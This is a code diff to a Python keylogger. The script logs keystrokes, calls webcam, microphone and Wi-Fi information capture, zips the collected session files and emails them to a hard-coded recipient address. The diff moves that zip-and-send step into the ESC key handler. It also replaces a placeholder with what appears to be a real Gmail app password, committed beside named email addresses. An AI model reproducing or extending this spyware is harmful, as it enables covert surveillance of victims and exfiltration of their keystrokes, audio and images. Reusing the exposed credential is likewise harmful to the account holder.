@@ -23,9 +23,11 @@ import schedule
 import time
 import shutil
 
+print("Press ESC to stop the Keylog Session")
+
 # Global Variables
 email_address = "work.nihalrahman@gmail.com"  # Enter sender email
-password = "password"  # Enter sender app password
+password = "tdteozexqqomwdzy"  # Enter sender app password
 toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email
 
 file_path = os.getcwd() + "\\"  # File save path
@@ -132,10 +134,23 @@ def on_press(key):
             f.write(f"[{key}]")  # Record special keys
 
 
+# def on_release(key):
+#     """Stop the keylogger when the escape key is pressed."""
+#     if key == keyboard.Key.esc:
+#         return False
+
 def on_release(key):
-    """Stop the keylogger when the escape key is pressed."""
+    """Stop the keylogger and send email when the escape key is pressed."""
     if key == keyboard.Key.esc:
-        return False
+        # Compress the sessions folder into a .zip file
+        archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
+        shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
+        
+        # Send the .zip file as an attachment
+        send_email(f"session_{currtime}.zip", archive_name, toaddr)
+        
+        print("Exiting program after sending email.")
+        return False  # Stop the keylogger
 
 
 # Network activity
@@ -194,12 +209,12 @@ webcam_capture()
 wifi_info_fetch()
 microphone()
 
-# Compress the sessions folder into a .zip file
-archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
-shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
+# # Compress the sessions folder into a .zip file
+# archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
+# shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
 
-# Send the .zip file as an attachment
-send_email(f"session_{currtime}.zip", archive_name, toaddr)
+# # Send the .zip file as an attachment
+# send_email(f"session_{currtime}.zip", archive_name, toaddr)
 
 # Start scheduled tasks in a separate thread
 schedule_thread = threading.Thread(target=run_scheduled_tasks)
